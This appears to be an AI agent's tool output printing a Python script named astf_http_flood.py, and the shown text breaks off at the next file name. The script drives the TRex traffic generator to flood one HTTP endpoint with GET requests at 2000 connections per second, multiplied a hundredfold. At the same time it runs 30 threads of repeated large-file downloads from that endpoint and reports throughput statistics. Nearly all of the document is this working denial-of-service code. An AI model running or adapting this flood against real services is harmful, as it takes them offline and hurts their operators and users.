    content: {"success": true, "mode": "live", "returncode": 0, "stdout": "======================================================================\nFILE: astf_http_flood.py\n#!/usr/bin/env python3\n\"\"\"\nFINAL: ASTF HTTP GET flood (multi-IP server pool to satisfy DP-core split)\n+ heavy concurrent real big-file downloads.\nTarget image: http://100.1.11.3:8081/api/activities/.../image (770093 bytes)\n\"\"\"\nimport time\nimport threading\nimport traceback\nfrom trex.astf.api import *\n\nSERVER = \"10.99.80.222\"\nTARGET = \"100.1.11.3\"\nPORT = 8081\nPATH = \"/api/activities/00000000-0000-0000-0000-000000000001/image\"\nDURATION = 8\nCPS = 2000\nMULT = 100\nN_DL = 30\nHDRS = {\"Host\": \"100.1.11.3:8081\", \"User-Agent\": \"Mozilla/5.0\",\n        \"Accept\": \"*/*\", \"Origin\": \"http://100.1.11.3:8081\"}\n\n\ndef build_profile():\n    req = (\"GET %s HTTP/1.1\\r\\nHost: 100.1.11.3:8081\\r\\nConnection: close\\r\\n\\r\\n\" % PATH).encode()\n    resp = b\"HTTP/1.1 200 OK\\r\\nContent-Length: 200\\r\\n\\r\\n\" + b\"A\" * 200\n    prog_c = ASTFProgram()\n    prog_c.send(req)\n    prog_c.recv(len(resp))\n    prog_s = ASTFProgram()\n    prog_s.recv(len(req))\n    prog_s.send(resp)\n    ipc = ASTFIPGenDist(ip_range=[\"100.1.11.10\", \"100.1.11.250\"], distribution=\"seq\")\n    # server pool needs >2 IPs (2 DP threads); include real target .3 (.3,.4,.5)\n    ips = ASTFIPGenDist(ip_range=[\"100.1.11.3\", \"100.1.11.5\"], distribution=\"seq\")\n    ipg = ASTFIPGen(ipc, ips, glob=ASTFIPGenGlobal(ip_offset=\"1.0.0.0\"))\n    tc = ASTFTCPClientTemplate(ip_gen=ipg, program=prog_c, port=PORT, cps=CPS)\n    ts = ASTFTCPServerTemplate(program=prog_s)\n    tmpl = ASTFTemplate(client_template=tc, server_template=ts)\n    return ASTFProfile(default_ip_gen=ipg, templates=[tmpl])\n\n\n# concurrent real downloads\nstop = threading.Event()\nstats = {\"bytes\": 0, \"ok\": 0, \"err\": 0}\nlk = threading.Lock()\n\n\ndef dl():\n    import http.client\n    while not stop.is_set():\n        try:\n            cn = http.client.HTTPConnection(TARGET, PORT, timeout=8)\n            cn.request(\"GET\", PATH, headers=HDRS)\n            r = cn.getresponse()\n            d = r.read()\n            cn.close()\n            with lk:\n                if r.status == 200:\n                    stats[\"bytes\"] += len(d); stats[\"ok\"] += 1\n                else:\n                    stats[\"err\"] += 1\n        except Exception:\n            with lk:\n                stats[\"err\"] += 1\n\n\nthreads = [threading.Thread(target=dl, daemon=True) for _ in range(N_DL)]\nfor t in threads:\n    t.start()\nprint(\"download threads started:\", N_DL)\n\nc = None\nastf_ok = False\ntry:\n    c = ASTFClient(server=SERVER)\n    c.connect()\n    c.reset()\n    print(\"ASTF connect+reset OK\")\n    prof = build_profile()\n    print(\"profile built; cps=%d mult=%d\" % (CPS, MULT))\n    c.load_profile(prof)\n    print(\"load_profile OK\")\n    c.start(mult=MULT, duration=DURATION, block=False)\n    astf_ok = True\n    print(\"ASTF STARTED mult=%d duration=%d\" % (MULT, DURATION))\nexcept Exception:\n    print(\"ASTF setup/start failed:\")\n    traceback.print_exc()\n\ntime.sleep(DURATION)\n\nif astf_ok and c is not None:\n    try:\n        s = c.get_stats()\n        g = s.get(\"global\", {}) if isinstance(s, dict) else {}\n        print(\"ASTF GLOBAL STATS:\", {k: g.get(k) for k in\n              [\"tx_pps\", \"tx_bps\", \"tx_cps\", \"active_flows\", \"cpu_util\", \"rx_drop_bps\"]})\n    except Exception as e:\n        print(\"get_stats err:\", repr(e))\n\nstop.set()\nfor t in threads:\n    t.join(timeout=5)\n\nif astf_ok and c is not None:\n    try:\n        c.stop()\n        c.reset()\n    except Exception:\n        pass\ntry:\n    if c is not None:\n        c.disconnect()\nexcept Exception:\n    pass\n\nprint(\"DL STATS:\", stats)\nprint(\"approx_MB_downloaded:\", round(stats[\"bytes\"] / 1e6, 2))\n\n======================================================================\nFILE: astf_a